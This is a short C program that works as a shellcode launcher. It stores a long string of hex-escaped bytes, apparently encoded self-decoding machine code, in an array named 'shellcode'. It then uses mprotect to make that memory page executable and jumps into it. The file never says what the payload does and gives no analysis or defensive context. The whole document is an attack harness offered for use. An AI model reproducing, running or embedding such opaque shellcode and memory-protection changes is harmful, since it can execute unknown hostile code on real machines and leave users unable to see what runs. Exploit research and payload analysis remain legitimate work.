
# include <sys/mman.h>

char shellcode[] = "\x60\x60\x50\x5e\x6a\x5e\x58\x50\x59\x34\x5e\x50\x5d\x48\x34\x5e\x50\x5a\x30\x56\x76\x30\x56\x77\x30\x4e\x78\x30\x56\x7a\x30\x56\x21\x2c\x76\x60\x30\x56\x21\x30\x56\x22\x30\x56\x24\x30\x56\x25\x30\x4e\x26\x30\x56\x28\x30\x56\x2f\x30\x56\x30\x30\x56\x32\x30\x56\x33\x30\x4e\x34\x30\x56\x36\x30\x56\x3d\x30\x56\x3e\x30\x56\x41\x30\x56\x42\x30\x56\x45\x30\x56\x48\x30\x56\x49\x30\x4e\x4a\x30\x56\x4b\x30\x56\x55\x30\x56\x5a\x30\x4e\x5a\x56\x5f\x55\x58\x50\x5b\x32\x5e\x5c\x43\x60\x42\x4c\x31\x79\x55\x5b\x32\x5e\x5d\x43\x21\x42\x3f\x60\x42\x52\x31\x79\x55\x5b\x32\x5e\x5e\x43\x21\x42\x3f\x60\x42\x58\x31\x79\x55\x5b\x32\x5e\x5f\x43\x21\x42\x3f\x31\x79\x29\x47\x5e\x29\x67\x5d\x60\x49\x4e\x29\x47\x5c\x47\x47\x47\x46\x46\x46\x46\x21\x7e\x5c\x26\x75\x4c\x61\x4b\x5b\x40\x4f\x59\x41\x7b\x6e\x5b\x75\x60\x67\x4a\x75\x48\x68\x5a\x67\x66\x62\x53\x44\x4d\x48\x77\x5a\x3f\x4a\x4b\x5b\x63\x70\x73\x6b\x75\x3f\x26";

int main() { 
    mprotect((void *)((int)shellcode & ~4095), 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
    (*(int (*)())shellcode)();
    return 0;
}
